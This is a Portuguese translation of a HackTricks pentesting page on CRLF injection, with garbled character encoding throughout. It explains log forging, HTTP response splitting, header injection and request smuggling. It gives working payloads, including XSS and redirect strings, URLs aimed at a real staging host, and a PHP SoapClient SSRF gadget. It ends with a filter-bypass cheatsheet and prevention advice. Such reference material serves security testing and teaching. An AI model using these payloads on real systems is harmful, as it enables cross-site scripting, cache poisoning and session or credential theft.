# Inje√ß√£o de CRLF (%0D%0A)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Se voc√™ est√° interessado em **carreira de hacking** e em hackear o inquebr√°vel - **estamos contratando!** (_flu√™ncia em polon√™s escrita e falada necess√°ria_).

{% embed url="https://www.stmcyber.com/careers" %}

## O que √© CRLF?

Quando um navegador envia uma solicita√ß√£o a um servidor web, o servidor responde com uma resposta contendo tanto os cabe√ßalhos de resposta HTTP quanto o conte√∫do do site, ou seja, o corpo da resposta. Os cabe√ßalhos HTTP e a resposta HTML (o conte√∫do do site) s√£o separados por uma combina√ß√£o espec√≠fica de caracteres especiais, nomeadamente um retorno de carro e uma alimenta√ß√£o de linha. Eles tamb√©m s√£o conhecidos como CRLF.

O servidor web usa o CRLF para entender quando um novo cabe√ßalho HTTP come√ßa e outro termina. O CRLF tamb√©m pode indicar a uma aplica√ß√£o web ou usu√°rio que uma nova linha come√ßa em um arquivo ou em um bloco de texto. Os caracteres CRLF s√£o uma mensagem padr√£o HTTP/1.1, portanto, s√£o usados por qualquer tipo de servidor web, incluindo Apache, Microsoft IIS e todos os outros.\
De [https://www.netsparker.com/blog/web-security/crlf-http-header/#](https://www.netsparker.com/blog/web-security/crlf-http-header/)

### O que √© a Vulnerabilidade de Inje√ß√£o de CRLF?

Em um ataque de vulnerabilidade de inje√ß√£o de CRLF, o atacante insere os caracteres de retorno de carro e alimenta√ß√£o de linha na entrada do usu√°rio para enganar o servidor, a aplica√ß√£o web ou o usu√°rio, fazendo-os pensar que um objeto terminou e outro come√ßou. Assim, as sequ√™ncias de CRLF n√£o s√£o caracteres maliciosos, no entanto, podem ser usados com inten√ß√µes maliciosas, para divis√£o de resposta HTTP, etc.

## Inje√ß√£o de CRLF em aplica√ß√µes web

Em aplica√ß√µes web, uma inje√ß√£o de CRLF pode ter impactos graves, dependendo do que a aplica√ß√£o faz com itens individuais. Os impactos podem variar desde a divulga√ß√£o de informa√ß√µes at√© a execu√ß√£o de c√≥digo, uma vulnerabilidade direta na seguran√ßa da aplica√ß√£o web. De fato, um ataque de inje√ß√£o de CRLF pode ter repercuss√µes muito s√©rias em uma aplica√ß√£o web, embora nunca tenha sido listado na lista OWASP Top 10. Por exemplo, tamb√©m √© poss√≠vel manipular arquivos de log em um painel administrativo, conforme explicado no exemplo abaixo.

#### Um exemplo de Inje√ß√£o de CRLF em um arquivo de log

Imagine um arquivo de log em um painel administrativo com o padr√£o de sa√≠da de fluxo de IP - Hora - Caminho Visitado, como o abaixo:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
Se um atacante conseguir injetar os caracteres CRLF na solicita√ß√£o HTTP, ele poder√° alterar o fluxo de sa√≠da e falsificar as entradas de log. Ele pode mudar a resposta da aplica√ß√£o web para algo como o abaixo:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Os %0d e %0a s√£o as formas codificadas em URL de CR e LF. Portanto, as entradas de log ficariam assim depois que o atacante inserisse esses caracteres e o aplicativo os exibisse:

IP - Hora - Caminho Visitado
```
123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Portanto, ao explorar uma vulnerabilidade de inje√ß√£o CRLF, o atacante pode falsificar entradas no arquivo de log para ofuscar suas pr√≥prias a√ß√µes maliciosas. O atacante est√° literalmente realizando sequestro de p√°gina e modificando a resposta. Por exemplo, imagine um cen√°rio onde o atacante tem a senha de admin e executou o par√¢metro restrictedaction, que s√≥ pode ser usado por um admin.

O problema √© que, se o administrador notar que um IP desconhecido usou o par√¢metro restrictedaction, perceber√° que algo est√° errado. No entanto, como agora parece que o comando foi emitido pelo localhost (e, portanto, provavelmente por algu√©m que tem acesso ao servidor, como um admin), isso n√£o parece suspeito.

Toda a parte da consulta que come√ßa com %0d%0a ser√° tratada pelo servidor como um par√¢metro √∫nico. Depois disso, h√° outro & com o par√¢metro restricted action que ser√° interpretado pelo servidor como outro par√¢metro. Efetivamente, esta seria a mesma consulta que:
```
/index.php?page=home&restrictedaction=edit
```
### Divis√£o de Resposta HTTP

#### Descri√ß√£o

Uma vez que o cabe√ßalho de uma resposta HTTP e seu corpo s√£o separados por caracteres CRLF, um atacante pode tentar injet√°-los. Uma combina√ß√£o de CRLFCRLF indicar√° ao navegador que o cabe√ßalho terminou e o corpo come√ßou. Isso significa que ele agora √© capaz de escrever dados dentro do corpo da resposta, onde o c√≥digo html √© armazenado. Isso pode levar a uma vulnerabilidade de Cross-site Scripting.

#### Um exemplo de Divis√£o de Resposta HTTP levando a XSS

Imagine uma aplica√ß√£o que define um cabe√ßalho personalizado, por exemplo:
```
X-Your-Name: Bob
```
```markdown
O valor do cabe√ßalho √© definido por um par√¢metro get chamado "name". Se n√£o houver codifica√ß√£o de URL em vigor e o valor for diretamente refletido dentro do cabe√ßalho, pode ser poss√≠vel para um atacante inserir a combina√ß√£o mencionada de CRLFCRLF para informar ao navegador que o corpo da solicita√ß√£o come√ßa. Dessa forma, ele pode inserir dados como payload de XSS, por exemplo:
```
```
?name=Bob%0d%0a%0d%0a<script>alert(document.domain)</script>
```
O exemplo acima exibir√° uma janela de alerta no contexto do dom√≠nio atacado.

#### Um exemplo de HTTP Response Splitting levando a Redirecionamento

{% embed url="https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62" %}

Navegador para:
```
/%0d%0aLocation:%20http://myweb.com
```
E o servidor responde com o cabe√ßalho:
```
Location: http://myweb.com
```
**Outro exemplo: (de** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### No Caminho da URL

Voc√™ pode enviar o payload **dentro do caminho da URL** para controlar a **resposta** do servidor:
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
```markdown
### Inje√ß√£o de Cabe√ßalho HTTP

#### Descri√ß√£o

Ao explorar uma inje√ß√£o CRLF, um atacante tamb√©m pode inserir cabe√ßalhos HTTP que podem ser usados para derrotar mecanismos de seguran√ßa, como o filtro XSS de um navegador ou a pol√≠tica de mesma origem (same-origin-policy). Isso permite que o atacante obtenha informa√ß√µes sens√≠veis, como tokens CSRF. Ele tamb√©m pode configurar cookies que podem ser explorados ao fazer o login da v√≠tima na conta do atacante ou ao explorar vulnerabilidades de cross-site scripting (XSS) que, de outra forma, n√£o seriam explor√°veis.

#### Um exemplo de Inje√ß√£o de Cabe√ßalho HTTP para extrair dados sens√≠veis

Se um atacante consegue injetar os cabe√ßalhos HTTP que ativam o CORS (Compartilhamento de Recursos de Origem Cruzada), ele pode usar javascript para acessar recursos que de outra forma seriam protegidos pela SOP (Pol√≠tica de Mesma Origem), que impede que sites de origens diferentes acessem uns aos outros.

### Nova requisi√ß√£o HTTP em SSRF

Abusando da inje√ß√£o CRLF, voc√™ pode **criar uma nova requisi√ß√£o HTTP e injet√°-la**.\
Um bom exemplo pode ser feito usando o gadget de desserializa√ß√£o `SoapClient` em PHP. Esta classe √© **vulner√°vel a CRLF** dentro do par√¢metro `user_agent`, permitindo **inserir novos cabe√ßalhos e conte√∫do no corpo**. No entanto, voc√™ pode at√© ser capaz de abusar dessa vulnerabilidade para **injetar uma nova requisi√ß√£o HTTP:**
```
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

#Put a nc listening in port 9090
$client->__soapCall("test", []);
```
### Inje√ß√£o de Cabe√ßalho para Request Smuggling

Voc√™ pode injetar cabe√ßalhos essenciais para garantir que o **back-end mantenha a conex√£o aberta** ap√≥s responder √† solicita√ß√£o inicial:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
Ent√£o, **especifique uma segunda requisi√ß√£o**. Aqui voc√™ tem um **cl√°ssico** [**request smuggling**](http-request-smuggling/) com **cabe√ßalhos/corpo extra** anexados pelo servidor ap√≥s a inje√ß√£o.\
Aqui est√£o duas das muitas op√ß√µes para explora√ß√£o entre usu√°rios.

Especificando um **prefixo malicioso** para envenenar a requisi√ß√£o do pr√≥ximo usu√°rio ou um cache da web:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

Ou criando nosso prefixo para combinar com o lixo remanescente e criar uma segunda requisi√ß√£o completa para acionar **response queue poisoning**.

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

Para mais informa√ß√µes sobre esta t√©cnica e problemas potenciais [**consulte a fonte original**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

### Inje√ß√£o em Memcache

Memcache √© um **armazenamento de chave-valor que usa um protocolo de texto claro**. Mais informa√ß√µes em:

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

Se uma plataforma est√° tomando **dados de uma requisi√ß√£o HTTP e os utilizando sem higieniza√ß√£o** para realizar **requisi√ß√µes** a um servidor **memcache**, um atacante poderia abusar desse comportamento para **injetar novos comandos memcache**.

Por exemplo, na vulnerabilidade originalmente descoberta, chaves de cache eram usadas para retornar o IP e a porta aos quais um usu√°rio deveria se conectar, e os atacantes conseguiram **injetar comandos memcache** que iriam **envenenar** o **cache para enviar os detalhes das v√≠timas** (incluindo nomes de usu√°rio e senhas) para os servidores do atacante:

<figure><img src="../.gitbook/assets/image (6) (1) (4).png" alt=""><figcaption></figcaption></figure>

Al√©m disso, os pesquisadores tamb√©m descobriram que eles poderiam dessincronizar as respostas do memcache para enviar o IP e portas dos atacantes para usu√°rios cujo email o atacante n√£o conhecia:

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

**Para a informa√ß√£o completa leia o**[ **artigo original**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)

## Impactos da Vulnerabilidade de Inje√ß√£o CRLF

O impacto das inje√ß√µes CRLF varia e tamb√©m inclui todos os impactos do Cross-site Scripting at√© a divulga√ß√£o de informa√ß√µes. Tamb√©m pode desativar certas restri√ß√µes de seguran√ßa como Filtros XSS e a Pol√≠tica de Mesma Origem nos navegadores das v√≠timas, deixando-os suscet√≠veis a ataques maliciosos.

### Como Prevenir Inje√ß√µes CRLF / Cabe√ßalhos HTTP em Aplica√ß√µes Web

A melhor t√©cnica de preven√ß√£o √© n√£o usar diretamente a entrada dos usu√°rios dentro dos cabe√ßalhos de resposta. Se isso n√£o for poss√≠vel, voc√™ deve sempre usar uma fun√ß√£o para codificar os caracteres especiais CRLF. Outra boa pr√°tica de seguran√ßa de aplica√ß√µes web √© atualizar sua linguagem de programa√ß√£o para uma vers√£o que n√£o permita a inje√ß√£o de CR e LF dentro de fun√ß√µes que definem cabe√ßalhos HTTP.

### CHEATSHEET
```
1. HTTP Response Splitting
‚Ä¢ /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
‚Ä¢ //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
‚Ä¢ /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
‚Ä¢ /google.com/%2F..%0D%0AHeader-Test:test2
‚Ä¢ /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
‚Ä¢ /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
‚Ä¢ /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
‚Ä¢ %E5%98%8A = %0A = \u560a
‚Ä¢ %E5%98%8D = %0D = \u560d
‚Ä¢ %E5%98%BE = %3E = \u563e (>)
‚Ä¢ %E5%98%BC = %3C = \u563c (<)
‚Ä¢ Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Ferramentas Autom√°ticas

* [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
* [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## Lista de Detec√ß√£o por For√ßa Bruta

* [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt)

## Refer√™ncias

* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Se voc√™ tem interesse em **carreira de hacking** e em hackear o inquebr√°vel - **estamos contratando!** (_√© necess√°rio polon√™s fluente escrito e falado_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Aprenda hacking em AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo do** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo do [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
